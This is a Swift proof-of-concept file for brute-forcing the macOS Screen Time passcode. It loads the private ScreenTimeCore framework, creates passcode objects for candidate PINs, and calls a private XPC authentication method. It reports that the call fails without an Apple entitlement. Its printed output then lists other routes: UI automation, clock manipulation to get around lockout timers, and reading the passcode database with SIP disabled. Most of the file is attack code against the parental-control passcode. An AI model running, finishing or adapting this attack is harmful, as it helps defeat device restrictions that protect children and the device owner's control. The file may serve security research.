// bruteforce_poc.swift
// Screen Time passcode brute-force proof of concept.
//
// This PoC demonstrates that the Screen Time passcode can be recovered
// by exploiting the wall-clock-based lockout timer. It creates
// STOpaquePasscode objects for each possible PIN (0000-9999) and
// attempts authentication via the XPC service.
//
// IMPORTANT: This requires the com.apple.private.screen-time entitlement
// to actually connect to the XPC service. Without it, the connection
// is immediately killed. This is a THEORETICAL PoC showing the attack
// would work if the entitlement check were bypassed.
//
// The practical attack uses UI automation (see bruteforce_ui.sh).

import Foundation

let handle = dlopen("/System/Library/PrivateFrameworks/ScreenTimeCore.framework/ScreenTimeCore", RTLD_NOW)
guard handle != nil else {
    print("Failed to load ScreenTimeCore")
    exit(1)
}

guard let opaqueClass = NSClassFromString("STOpaquePasscode") as? NSObject.Type else {
    print("Failed to load STOpaquePasscode class")
    exit(1)
}

let allocSel = NSSelectorFromString("alloc")
let initSel = NSSelectorFromString("initWithPasscode:")

func makePasscode(_ pin: String) -> NSObject {
    let raw = opaqueClass.perform(allocSel)!.takeUnretainedValue()
    return raw.perform(initSel, with: pin as NSString)!.takeUnretainedValue() as! NSObject
}

// Demonstrate: we can create STOpaquePasscode objects for all 10,000 PINs
print("=== Screen Time Passcode Brute-Force PoC ===\n")
print("Creating STOpaquePasscode objects for sample PINs:")

for pin in ["0000", "1234", "5678", "9999"] {
    let obj = makePasscode(pin)
    let passSel = NSSelectorFromString("passcode")
    let val = obj.perform(passSel)?.takeUnretainedValue() as? String ?? "?"
    print("  PIN \(pin) → STOpaquePasscode(passcode: \"\(val)\")")
}

print("\nAttempting XPC connection to ScreenTimeAgent...")

// Try to connect and authenticate
guard let proto = NSProtocolFromString("STPrivateServiceProtocol") else {
    print("Failed to find STPrivateServiceProtocol")
    exit(1)
}

let iface = NSXPCInterface(with: proto)
let conn = NSXPCConnection(machServiceName: "com.apple.ScreenTimeAgent.private")
conn.remoteObjectInterface = iface

var connectionKilled = false
conn.interruptionHandler = {
    connectionKilled = true
    print("\n⚠ Connection INTERRUPTED — missing entitlement")
    print("  The XPC service rejected our connection because we lack")
    print("  com.apple.private.screen-time entitlement.")
    print("\n  This confirms the entitlement is checked per-connection,")
    print("  not per-method. Without an Apple-signed binary that has")
    print("  this entitlement, XPC brute-force is not possible.")
    print("\n  Viable alternatives:")
    print("  1. UI automation via Accessibility APIs (see bruteforce_ui.sh)")
    print("  2. Clock manipulation to bypass lockout timers")
    print("  3. Direct database read (requires SIP disabled or external boot)")
}
conn.resume()

// Try calling authenticateRestrictionsPasscode:completionHandler:
let proxy = conn.remoteObjectProxyWithErrorHandler { error in
    print("XPC Error: \(error.localizedDescription)")
}

let authSel = NSSelectorFromString("authenticateRestrictionsPasscode:completionHandler:")
let testPin = makePasscode("0000")

print("Calling authenticateRestrictionsPasscode with PIN '0000'...")
(proxy as AnyObject).perform(authSel, with: testPin, with: { (success: Bool, error: Error?) in
    if success {
        print("✓ PIN '0000' is correct!")
    } else {
        print("✗ PIN '0000' is incorrect")
    }
} as @convention(block) (Bool, Error?) -> Void)

RunLoop.main.run(until: Date(timeIntervalSinceNow: 3))

if !connectionKilled {
    print("\nConnection survived — entitlement check may not apply!")
    print("Full brute-force would iterate 0000-9999...")
}
